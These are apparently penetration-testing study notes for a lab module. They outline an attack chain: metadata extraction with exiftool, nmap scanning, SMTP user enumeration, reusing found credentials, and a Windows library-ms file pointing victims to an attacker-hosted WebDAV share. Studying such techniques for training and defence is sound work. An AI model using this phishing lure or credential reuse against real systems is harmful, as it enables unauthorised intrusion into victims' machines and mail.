### Information gathering
```
$ exiftool -a -u *.pdf
```
%% -a display duplicated tags and -u to display unknown tags %%

```
$ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```
%% command to start WebDav share on host machine %%

### Attack chain for final module (methodology)
```
nmap -sC -sV -p- <TARGET-IP>
```
%% start with port scanning %%
- **Protocol Verification:** Check if the SMTP service exposes commands like VRFY, EXPN, or RCPT TO in the Nmap output scripts or manual handshakes.
```
exiftool info.pdf
```
%% you find info.pdf while fuzzing for web directories on one of the web servers exposed using ffuf with dirbuster wordlist and extensions .pdf and .txt %%
- Test the credentials found username:test@supermagic.com and password: test with both smtp and imap servers
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<attack-machine></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

%%  open microsoft visual studio and save above XML code as config.library-ms, it should point back to your webdav server in the kali machine %%



